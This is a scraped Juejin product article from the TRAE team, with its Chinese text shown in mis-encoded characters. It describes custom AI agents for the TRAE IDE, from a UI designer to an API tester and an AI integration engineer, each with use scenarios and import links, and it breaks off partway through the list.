content="2025-12-16T05:33:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            8 ä¸ªæ”¯æŒä¸€é”®å¯¼å…¥ TRAE ä½¿ç”¨çš„è‡ªå®šä¹‰æ™ºèƒ½ä½“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T05:33:09.000Z" title="Tue Dec 16 2025 05:33:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e0d91ea29be403ea8f08e9c3c89cc41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=IlXT3cYI%2FmfofW5mTFCeaDxl6Zc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æœ¬æ–‡ä½œè€…ï¼šæ¡”æ¢—ï¼ŒTRAE æŠ€æœ¯ä¸“å®¶ï¼›Jiaqiï¼ŒTRAE æŠ€æœ¯æ–‡æ¡£å·¥ç¨‹å¸ˆ</p>
</blockquote>
<p>é’ˆå¯¹é¡¹ç›®å¼€å‘ä¸­çš„ä¸åŒåœºæ™¯ï¼Œæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—å¯ç›´æ¥å¯¼å…¥ TRAE å¹¶ä½¿ç”¨çš„è‡ªå®šä¹‰æ™ºèƒ½ä½“ç¤ºä¾‹ã€‚è¿™äº›æ™ºèƒ½ä½“å¯ä»¥è¢«å•ç‹¬è°ƒç”¨ï¼Œæˆ–åœ¨å¼€å‘æµç¨‹çš„ç›¸åº”é˜¶æ®µç”± SOLO Coder è‡ªåŠ¨è°ƒç”¨ï¼Œä»¥å®Œæˆç‰¹å®šä»»åŠ¡ã€‚åŒæ—¶ï¼Œè¿™äº›è‡ªå®šä¹‰æ™ºèƒ½ä½“ä¹Ÿå¯ä»¥ä½œä¸ºå‚è€ƒæ¨¡æ¿ï¼Œä½ å¯ä»¥æ ¹æ®å®é™…éœ€æ±‚è°ƒæ•´ç°æœ‰é…ç½®ã€‚</p>
<p>åªéœ€è¦åœ¨ç”µè„‘ç«¯è®¿é—®ä¸‹è¡¨ä¸­ç›¸åº”çš„é“¾æ¥ï¼Œå³å¯å°†è¿™äº›æ™ºèƒ½ä½“å¿«é€Ÿå¯¼å…¥ TRAE ä¸­å¹¶ä½¿ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a96f1215441e4cf0b07488651d7a1189~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=CW4VIgltQmyOHO2%2FRLR3gJeVLEU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>UI è®¾è®¡å¸ˆ</strong></h2>
<h3 data-id="heading-1"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>UI Designer</p>
<h3 data-id="heading-2"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>UI Designerï¼ˆui-designerï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ UI/UX è®¾è®¡æ™ºèƒ½ä½“ï¼Œç”¨äºåˆ›å»ºç•Œé¢ã€è®¾è®¡ç»„ä»¶ã€æ­å»ºè®¾è®¡ç³»ç»Ÿå’Œæå‡è§†è§‰ç¾æ„Ÿã€‚å®ƒå…¼é¡¾å¯è®¿é—®æ€§ã€ç”¨æˆ·ä½“éªŒã€ç»„ä»¶ä¸€è‡´æ€§å’Œè·¨å¹³å°é€‚é…ï¼Œèƒ½æä¾›å¯è½åœ°çš„è®¾è®¡æ–¹æ¡ˆå’ŒæŠ€æœ¯æŒ‡å¯¼ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>ç»„ä»¶åº“è®¾è®¡ï¼š</strong> è®¾è®¡ç»Ÿä¸€æŒ‰é’®ã€è¡¨å•ç­‰ç»„ä»¶ï¼ŒåŒ…å«å¤šç§çŠ¶æ€å’Œå˜ä½“ã€‚</p>
</li>
<li>
<p><strong>ç•Œé¢ä¼˜åŒ–ï¼š</strong> æ”¹å–„å¸ƒå±€å’Œè§†è§‰å±‚çº§ï¼Œæå‡å¯ç”¨æ€§ã€‚</p>
</li>
<li>
<p><strong>è®¾è®¡ç³»ç»Ÿå»ºè®¾ï¼š</strong> æ ‡å‡†åŒ–é¢œè‰²ã€æ’ç‰ˆã€é—´è·ç­‰è®¾è®¡ tokenï¼Œä¿è¯è·¨äº§å“ä¸€è‡´æ€§ã€‚</p>
</li>
<li>
<p><strong>è·¨å¹³å°é€‚é…ï¼š</strong> ç¡®ä¿ç•Œé¢åœ¨ä¸åŒå±å¹•å’Œè®¾å¤‡ä¸Šè¡¨ç°ä¸€è‡´ã€‚</p>
</li>
</ul>
<h3 data-id="heading-3"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li>
<p><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F8fdcb7" target="_blank" title="https://s.trae.com.cn/a/8fdcb7" ref="nofollow noopener noreferrer">s.trae.com.cn/a/8fdcb7</a></p>
</li>
<li>
<p><strong>TRAE å›½é™…ç‰ˆï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F878f64" target="_blank" title="https://s.trae.ai/a/878f64" ref="nofollow noopener noreferrer">s.trae.ai/a/878f64</a></p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee3315025f8b4bc38431475d4692adf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=uyaIq%2FsNeejWw6byyfgM1KKLC7U%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/165dcfaba680418cb67f8b4f5f44c248~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=RA9iyYDKhn7Y9n6ZexfXYqZr9UI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>å‰ç«¯æ¶æ„å¸ˆ</strong></h2>
<h3 data-id="heading-5"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>Frontend Architect</p>
<h3 data-id="heading-6"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>Frontend Architectï¼ˆfrontend-architectï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å‰ç«¯æ¶æ„æ™ºèƒ½ä½“ï¼Œæ“…é•¿æ„å»ºé«˜æ€§èƒ½ã€å¯æ‰©å±•çš„å‰ç«¯ç•Œé¢ï¼Œæ¶µç›– Reactã€Vue å’Œ Angular ç­‰ä¸»æµæ¡†æ¶ã€‚å®ƒèƒ½å¤Ÿåœ¨ç»„ä»¶å¼€å‘ã€çŠ¶æ€ç®¡ç†ã€æ€§èƒ½ä¼˜åŒ–ã€è·¨æµè§ˆå™¨é€‚é…ç­‰æ–¹é¢æä¾›ä¸“ä¸šæŒ‡å¯¼ï¼Œå¹¶è¾“å‡ºå¯è½åœ°çš„å‰ç«¯å®ç°æ–¹æ¡ˆã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>ç•Œé¢å¼€å‘ï¼š</strong> å®ç°å“åº”å¼ã€å¯è®¿é—®çš„ UIï¼Œç¡®ä¿ä¸è®¾è®¡ç³»ç»Ÿä¸€è‡´ï¼Œå¹¶æ”¯æŒåŠ¨ç”»å’Œäº¤äº’ä¼˜åŒ–ã€‚</p>
</li>
<li>
<p><strong>ç»„ä»¶æ¶æ„ï¼š</strong> è®¾è®¡å¯å¤ç”¨ã€å¯ç»´æŠ¤çš„ç»„ä»¶ä½“ç³»ï¼Œç®¡ç†ç”Ÿå‘½å‘¨æœŸå’Œç»„ä»¶æ¥å£ã€‚</p>
</li>
<li>
<p><strong>çŠ¶æ€ç®¡ç†ï¼š</strong> å¤„ç†å¤æ‚çŠ¶æ€é€»è¾‘ï¼Œé€‰å‹å¹¶å®ç° Reduxã€Vuexã€NgRx ç­‰çŠ¶æ€ç®¡ç†æ–¹æ¡ˆã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–ï¼š</strong> é€šè¿‡ä»£ç æ‹†åˆ†ã€æ‡’åŠ è½½ã€è™šæ‹Ÿæ»šåŠ¨ç­‰æŠ€æœ¯æå‡æ¸²æŸ“å’ŒåŠ è½½æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>å‰ç«¯å·¥ç¨‹ä¸è´¨é‡ä¿éšœï¼š</strong> é…ç½®æ„å»ºå·¥å…·ã€CI/CDã€æµ‹è¯•ä½“ç³»ï¼Œç¡®ä¿ä»£ç è´¨é‡ã€å®‰å…¨æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
</li>
</ul>
<h3 data-id="heading-7"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F3fbe5a" target="_blank" title="https://s.trae.com.cn/a/3fbe5a" ref="nofollow noopener noreferrer">s.trae.com.cn/a/3fbe5a</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2Ff8219e" target="_blank" title="https://s.trae.ai/a/f8219e" ref="nofollow noopener noreferrer">s.trae.ai/a/f8219e</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b814b287fe54a55b3086089602bcc82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=7hf2IA9hLtMvYD0GDSXx9umR2o8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8"><strong>åç«¯æ¶æ„å¸ˆ</strong></h2>
<h3 data-id="heading-9"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>Backend Architect</p>
<h3 data-id="heading-10"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>Backend Architectï¼ˆbackend-architectï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„åç«¯æ¶æ„æ™ºèƒ½ä½“ï¼Œæ“…é•¿è®¾è®¡é«˜æ€§èƒ½ã€å¯æ‰©å±•ä¸”å®‰å…¨çš„æœåŠ¡å™¨ç«¯ç³»ç»Ÿã€‚å®ƒèƒ½å¤Ÿåœ¨ API è®¾è®¡ã€ä¸šåŠ¡é€»è¾‘å®ç°ã€æ•°æ®åº“æ¶æ„ã€ç³»ç»Ÿæ€§èƒ½ä¼˜åŒ–å’Œå¯æ‰©å±•æ€§ç­‰æ–¹é¢æä¾›ä¸“ä¸šæŒ‡å¯¼ï¼Œå¹¶è¾“å‡ºå¯è½åœ°çš„åç«¯è§£å†³æ–¹æ¡ˆã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>API è®¾è®¡ï¼š</strong> è®¾è®¡ RESTful æˆ– GraphQL æ¥å£ï¼Œè§„èŒƒè¯·æ±‚/å“åº”ã€è®¤è¯å’Œç‰ˆæœ¬ç®¡ç†ã€‚</p>
</li>
<li>
<p><strong>ä¸šåŠ¡é€»è¾‘å®ç°ï¼š</strong> æ„å»ºå¯æ‰©å±•çš„æœåŠ¡å±‚ï¼Œå¤„ç†å¤æ‚ä¸šåŠ¡è§„åˆ™ã€å¼‚æ­¥ä»»åŠ¡å’Œç¼“å­˜ç­–ç•¥ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®åº“æ¶æ„ä¸ä¼˜åŒ–ï¼š</strong> è®¾è®¡é«˜æ•ˆæ•°æ®åº“ç»“æ„ï¼Œä¼˜åŒ–æŸ¥è¯¢æ€§èƒ½ï¼Œé€‰æ‹©åˆé€‚çš„æ•°æ®å­˜å‚¨æ–¹æ¡ˆã€‚</p>
</li>
<li>
<p><strong>ç³»ç»Ÿæ€§èƒ½ä¸å¯æ‰©å±•æ€§ï¼š</strong> å®ç°è´Ÿè½½å‡è¡¡ã€è‡ªåŠ¨æ‰©å®¹ã€é«˜å¯ç”¨å’Œç›‘æ§å‘Šè­¦ä½“ç³»ã€‚</p>
</li>
<li>
<p><strong>å®‰å…¨ä¸è¿ç»´ï¼š</strong> ä¿è¯è®¤è¯æˆæƒã€æ•°æ®åŠ å¯†ã€åˆè§„æ€§ï¼Œé…ç½® CI/CDã€å®¹å™¨åŒ–å’ŒåŸºç¡€è®¾æ–½ç®¡ç†ã€‚</p>
</li>
</ul>
<h3 data-id="heading-11"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F441a24" target="_blank" title="https://s.trae.com.cn/a/441a24" ref="nofollow noopener noreferrer">s.trae.com.cn/a/441a24</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F92731a" target="_blank" title="https://s.trae.ai/a/92731a" ref="nofollow noopener noreferrer">s.trae.ai/a/92731a</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ceed2d16a6f4431bb84b3f7a0ae135e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=gDuCFGz8MnvwqbE4EKB%2BYgskZvM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09e89498e84640c186104663aae7d5a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=MOaBHVEMT%2FsJGT%2BN8hfJBI2cJzw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12"><strong>API æµ‹è¯•å·¥ç¨‹å¸ˆ</strong></h2>
<h3 data-id="heading-13"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>API Test Pro</p>
<h3 data-id="heading-14"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>API Test Proï¼ˆapi-test-proï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ API æµ‹è¯•æ™ºèƒ½ä½“ï¼Œæ“…é•¿åŠŸèƒ½éªŒè¯ã€æ€§èƒ½æµ‹è¯•ã€è´Ÿè½½æµ‹è¯•å’Œå¥‘çº¦åˆè§„æ£€æŸ¥ã€‚å®ƒèƒ½å¤Ÿå…¨é¢è¯„ä¼° RESTã€GraphQLã€gRPC ç­‰æ¥å£çš„å¯é æ€§ã€æ€§èƒ½å’Œå®‰å…¨æ€§ï¼Œå¹¶æä¾›å¯è½åœ°çš„æµ‹è¯•æŠ¥å‘Šä¸æ”¹è¿›å»ºè®®ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>å¥‘çº¦æµ‹è¯•ï¼š</strong> éªŒè¯ API ä¸ OpenAPI/Swagger è§„èŒƒä¸€è‡´ï¼Œç¡®ä¿è¯·æ±‚/å“åº”ç¬¦åˆè®¾è®¡ã€‚</p>
</li>
<li>
<p><strong>åŠŸèƒ½æµ‹è¯•ï¼š</strong> æ£€æµ‹å„æ¥å£çš„æœ‰æ•ˆ/æ— æ•ˆè¾“å…¥å¤„ç†ã€è¾¹ç•Œæƒ…å†µã€é”™è¯¯å¤„ç†å’Œä¸šåŠ¡é€»è¾‘æ­£ç¡®æ€§ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½æµ‹è¯•ï¼š</strong> è¯„ä¼°æ¥å£å“åº”æ—¶é—´ã€è¯†åˆ«ç“¶é¢ˆã€éªŒè¯æ€§èƒ½ SLAã€‚</p>
</li>
<li>
<p><strong>è´Ÿè½½æµ‹è¯•ï¼š</strong> æ¨¡æ‹Ÿå¹¶å‘ç”¨æˆ·ã€å‹åŠ›åœºæ™¯ï¼Œæ£€æŸ¥ç³»ç»Ÿåœ¨é«˜è´Ÿè½½ä¸‹çš„ç¨³å®šæ€§å’Œé™çº§ç­–ç•¥ã€‚</p>
</li>
<li>
<p><strong>å®‰å…¨æµ‹è¯•ï¼š</strong> å‘ç°å¸¸è§æ¼æ´ï¼Œå¦‚ SQL æ³¨å…¥ã€XSSã€è®¤è¯ç»•è¿‡ç­‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-15"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F1ea8bb" target="_blank" title="https://s.trae.com.cn/a/1ea8bb" ref="nofollow noopener noreferrer">s.trae.com.cn/a/1ea8bb</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F55b143" target="_blank" title="https://s.trae.ai/a/55b143" ref="nofollow noopener noreferrer">s.trae.ai/a/55b143</a></p>
<p>å¦‚å®ä¾‹å›¾æ‰€ç¤ºï¼Œåœ¨é¡¹ç›®é‡æ„ä¸­ï¼ŒSOLO Coder å…ˆåè°ƒç”¨äº† UI è®¾è®¡å¸ˆã€å‰ç«¯æ¶æ„å¸ˆã€åç«¯æ¶æ„å¸ˆå’Œ API æµ‹è¯•å·¥ç¨‹å¸ˆæ¥ååŒå®Œæˆä»»åŠ¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40e5d6aa081247fbb1da74689789955d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=LictVjmvBGxIn%2Fa%2BKQi90sUw4Cc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57d1c8c212d046e0bfdbadb91ffdd0ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=VcyJ5IWuBop6QQuJea1F8IdC0Ek%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-16"><strong>AI é›†æˆå·¥ç¨‹å¸ˆ</strong></h2>
<h3 data-id="heading-17"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>AI Integration Eng</p>
<h3 data-id="heading-18"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>AI Integration Engineerï¼ˆai-integration-engineerï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ AI/ML é›†æˆæ™ºèƒ½ä½“ï¼Œæ“…é•¿å°†äººå·¥æ™ºèƒ½åŠŸèƒ½æ•´åˆåˆ°åº”ç”¨ä¸­ï¼ŒåŒ…æ‹¬è¯­è¨€æ¨¡å‹é›†æˆã€æ¨èç³»ç»Ÿæ„å»ºå’Œæ™ºèƒ½è‡ªåŠ¨åŒ–å®ç°ã€‚å®ƒèƒ½å¤Ÿæä¾›å¯è½åœ°çš„ AI è§£å†³æ–¹æ¡ˆï¼Œå…¼é¡¾æ€§èƒ½ã€å¯é æ€§å’Œä¸šåŠ¡ä»·å€¼ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>è¯­è¨€æ¨¡å‹é›†æˆï¼š</strong> å°† GPT ç­‰å¤§æ¨¡å‹æ¥å…¥åº”ç”¨ï¼Œå¤„ç†å¯¹è¯ã€æ–‡æœ¬ç”Ÿæˆæˆ–è‡ªç„¶è¯­è¨€ç†è§£ä»»åŠ¡ã€‚</p>
</li>
<li>
<p><strong>æ¨èç³»ç»Ÿå¼€å‘ï¼š</strong> æ„å»ºåŸºäºååŒè¿‡æ»¤ã€å†…å®¹æˆ–æ··åˆç®—æ³•çš„ä¸ªæ€§åŒ–æ¨èå¼•æ“ï¼Œæ”¯æŒå®æ—¶æ¨é€ä¸å†·å¯åŠ¨å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>æ™ºèƒ½è‡ªåŠ¨åŒ–ï¼š</strong> å®ç°åŠ¨æ€å®šä»·ã€æµç¨‹è‡ªåŠ¨åŒ–æˆ–å†³ç­–ç³»ç»Ÿï¼Œç»“åˆè§„åˆ™ä¸ ML é¢„æµ‹æå‡æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>æ¨¡å‹éƒ¨ç½²ä¸ä¼˜åŒ–ï¼š</strong> å®¹å™¨åŒ–éƒ¨ç½²ã€è“ç»¿/é‡‘ä¸é›€å‘å¸ƒã€æ€§èƒ½ä¼˜åŒ–å’Œç›‘æ§ï¼Œç¡®ä¿æ¨¡å‹å¯é è¿è¡Œã€‚</p>
</li>
<li>
<p><strong>æ•°æ®ä¸å®‰å…¨ç®¡ç†ï¼š</strong> è®¾è®¡å¯æ‰©å±•æ•°æ®ç®¡é“ã€éšç§ä¿æŠ¤æœºåˆ¶ã€åå·®æ£€æµ‹ä¸åˆè§„æ€§æªæ–½ã€‚</p>
</li>
</ul>
